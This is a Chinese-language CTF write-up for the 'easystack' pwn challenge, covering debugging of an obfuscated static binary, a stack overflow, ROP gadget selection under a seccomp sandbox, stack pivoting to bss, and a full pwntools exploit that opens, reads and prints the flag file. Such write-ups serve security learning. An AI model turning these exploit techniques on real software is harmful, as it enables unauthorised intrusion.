---
title: easystack_wp
date: 2021-11-18 00:12:01
permalink: /pages/ea4dff/
categories:
  - ctf_wp
  - gadget
tags:
  - 
---
# easystack

[toc]

## 分析

文件是静态编译的, 所以里面很多库函数, 且去掉了符号, 

![image-20210924180704258](https://s2.loli.net/2021/12/28/OVka2FCT9QSeEpL.png)

先运行下, 功能似乎比较简单, 也只有一个输入, 

尝试输入大量数据,  会出现栈溢出,

![image-20210924181759784](https://s2.loli.net/2021/12/28/5tfG4vgNkepLEIs.png)

## 调试

ida打开也是比较凌乱, 

开始调试, 一直f8, 会遇到功能函数跑飞了, 然后下断点, 下次f7进入后继续一直f8, 慢慢找到关键位置,

------------

可以找到start函数, 简单分析, 应该是有简单的ollvm的混淆, 直接调试, 一直f8, 发现在这个函数内执行功能函数, 于是下次调试跟进, 

![image-20210924180739708](https://s2.loli.net/2021/12/28/rw5BdUkTaeVCtPH.png) 

然后继续定位到这个函数调用,

![image-20210924180908079](https://s2.loli.net/2021/12/28/gfolZ3BAVhDrYcW.png)

再次调试并进入, 在这个调用处跑飞, 

![image-20210924180957294](https://s2.loli.net/2021/12/28/xeDgFMX16SmPUwb.png)

于是再次调试, 确定到了关键位置, `LOAD:0000000000409513`

这一部分是关键位置了, 也是同样的调试手段,

按照运行流程调试下来应该是这样: 

![image-20210924181138985](https://s2.loli.net/2021/12/28/kwfigKRaFjSOVs1.png)

![image-20210924181240333](https://s2.loli.net/2021/12/28/GSs2ICoVNQblH6k.png)

![image-20210924181254758](https://s2.loli.net/2021/12/28/ZyDcam81Y9sNfCt.png)

![image-20210924181321857](https://s2.loli.net/2021/12/28/U3JyzSRF86r2d57.png)

![image-20210924181330404](https://s2.loli.net/2021/12/28/HbjrcpYSof9sMy7.png)

其中`.text:0000000000401317  call    sub_402CF0`函数`sub_402CF0`,  应该是read函数, 

在最后的`retn`位置会激活栈溢出漏洞, 

## 利用

就是rop了, 

### execve

看了下程序静态编译, 没有`/bin/sh`字符串, 估计也没有system函数, 于是想通过execve, 找了下相关gadget, 基本可以使用, 

```
poprax: 0x0000000000401001: 
	pop rax; ret; 
poprdi: 0x000000000040117b: 
	pop rdi; pop rbp; ret;
poprsi: 0x0000000000401179: 
	pop rsi; pop r15; pop rbp; ret;
popr14: 0x0000000000401178: 
	pop r14; pop r15; pop rbp; ret; 
movrdxr13: 0x0000000000405d11: 
	mov rdx, r14; syscall;
```

然后发现其实有沙盒, 

![image-20210924221256933](https://s2.loli.net/2021/12/28/9wTMuYWrqc4BJpv.png)

于是考虑open read write, 但是上述的`mov rdx, r14; syscall`后面不可控, 

### rdx

但是rdx为9, 最后读取flag文件的时候只能读到前部分, 于是必须得控制rdx, 

选择了这么一段:

```
popr12: 0x000000000040673e: 
	pop r12; pop r14; pop r15; pop rbp; ret;
movrdxr12: 0x0000000000402792: 
	mov rdx, r12; call r14;
popret: 0x000000000040117c: 
	pop rbp; ret; 
```

首先设置r12, r14, r12赋值给rdx, r14可以继续控制执行流,  但是使用`call`因此有个返回地址压栈, 我们使用个`pop`即可弹出, 然后ret继续通过栈内我们的数据去控制执行流, 继续rop, 

这一部分图示如下: 

![image-20210924221622639](https://s2.loli.net/2021/12/28/eUcYR46Tgsb3Wnd.png)

![image-20210924221540345](https://s2.loli.net/2021/12/28/gY4T5QcBPCwoeSb.png)

![image-20210924221549989](https://s2.loli.net/2021/12/28/xBpJqnCvVT3G1yL.png)

![image-20210924221558339](https://s2.loli.net/2021/12/28/4URI8QdbhBLqGuo.png)

于是可以控制rdx, 

但是这种方案直接进行orw栈长度不够, 调整各个gadget达到最小仍然不行:

这段是最小的rop: 

```python

poprax = 0x0000000000401001
poprdi = 0x000000000040117b
poprsi = 0x0000000000401179
popr13 = 0x0000000000401176
sysret = 0x000000000040785d
popret = 0x000000000040117c
popr12 = 0x000000000040673e

movrdxr13 = 0x0000000000402700
movrdxr12 = 0x0000000000402792

leave  = 0x0000000000404001

rop = flat(
		# rdx = 9
		# open(flag, 0, ..)
		poprax, 2, 
		poprsi, 0, 0, 0, 
		poprdi, flag, 0, 
		sysret, 
		
		# set rdx=0x200
		
		# poprax, popret, 
		# popr13, 0x200, 0, 0, 0, 
		# movrdxr13, 
		popr12, 0x200, popret, 0, 0, 
		movrdxr12, 

		# read(3, flag, ..)
		poprax, 0, 
		poprsi, flag, 0, 0, 
		poprdi, 3, 0, 
		sysret, 

		# wirte(1, flag, ..)
		poprax, 1, 
		poprdi, 1, 0, 
		sysret, 
		)
```

### 栈迁移

然后使用栈迁移的手段, 先构造个read读取后段rop到bss段, 然后迁移到bss段, 

找到一段leave的gadget,  先控制rdi指向一个可写地址即可, 

```
leave: 0x0000000000404001: 
	leave; mov qword ptr [rdi + rdx - 0x2f], rax; mov qword ptr [rdi + rdx - 0x27], rax; mov rax, rdi; ret; 

```

然后可以栈迁移, 

```python
	payload = b'./flag\x00'.ljust(0x118, b'a') + flat(
		popr12, 0x200, popret, 0, 0, 
		movrdxr12, 

		poprax, 0, 
		poprsi, stack, 0, 0, 
		poprdi, 0, 0, 
		sysret, 

		poprdi, bss, stack - 0x8, 
		leave, 
		)
	# gdb.attach(cn, cmd)
	cn.sendline(payload)
	# pause()
	cn.sendline(rop)
```

## exp:

```python
from pwn import * 

context.log_level='debug'
context.arch='amd64'

cn = process("./easystack")

cmd = '''
b * 0x000000000040132F
'''

poprax = 0x0000000000401001
poprdi = 0x000000000040117b
poprsi = 0x0000000000401179
popr13 = 0x0000000000401176
sysret = 0x000000000040785d
popret = 0x000000000040117c
popr12 = 0x000000000040673e

movrdxr13 = 0x0000000000402700
movrdxr12 = 0x0000000000402792

leave  = 0x0000000000404001

def sys(rax, rdi, rsi, rdx):
	return flat(
		poprax, popret, 
		popr13, rdx, 0, 0, 0,
		movrdxr13, 
		poprdi, rdi, 0, 
		poprsi, rsi, 0, 0, 
		poprax, rax, 
		sysret, 
		)



bss   = 0x000000000040c148
flag  = bss
stack = bss + 0x500

def exp():
	'''
	payload = b'./flag\x00'.ljust(0x118, b'a') + flat(
		# rdx = 9
		# open(flag, 0, ..)
		poprax, 2, 
		poprsi, 0, 0, 0, 
		poprdi, flag, 0, 
		sysret, 

		# read(3, flag, ..)
		poprax, 0, 
		poprsi, flag, 0, 0, 
		poprdi, 3, 0, 
		sysret, 

		# wirte(1, flag, ..)
		poprax, 1, 
		poprdi, 1, 0, 
		sysret, 
		)
	'''

	'''
	payload = b'./flag\x00'.ljust(0x118, b'a') + \
			sys(2, flag, 0, 0) + \
			sys(0, 3, flag, 0x200) + \
			sys(1, 1, flag, 0x200) 
	'''

	rop = flat(
		# rdx = 9
		# open(flag, 0, ..)
		poprax, 2, 
		poprsi, 0, 0, 0, 
		poprdi, flag, 0, 
		sysret, 
		
		# set rdx=0x200
		
		# poprax, popret, 
		# popr13, 0x200, 0, 0, 0, 
		# movrdxr13, 
		popr12, 0x200, popret, 0, 0, 
		movrdxr12, 

		# read(3, flag, ..)
		poprax, 0, 
		poprsi, flag, 0, 0, 
		poprdi, 3, 0, 
		sysret, 

		# wirte(1, flag, ..)
		poprax, 1, 
		poprdi, 1, 0, 
		sysret, 
		)

	payload = b'./flag\x00'.ljust(0x118, b'a') + flat(
		popr12, 0x200, popret, 0, 0, 
		movrdxr12, 

		poprax, 0, 
		poprsi, stack, 0, 0, 
		poprdi, 0, 0, 
		sysret, 

		poprdi, bss, stack - 0x8, 
		leave, 
		)
	# gdb.attach(cn, cmd)
	cn.sendline(payload)
	# pause()
	cn.sendline(rop)

exp()
cn.interactive()
```

![image-20210924222030980](https://s2.loli.net/2021/12/28/F1koRVAdwbazLIm.png)
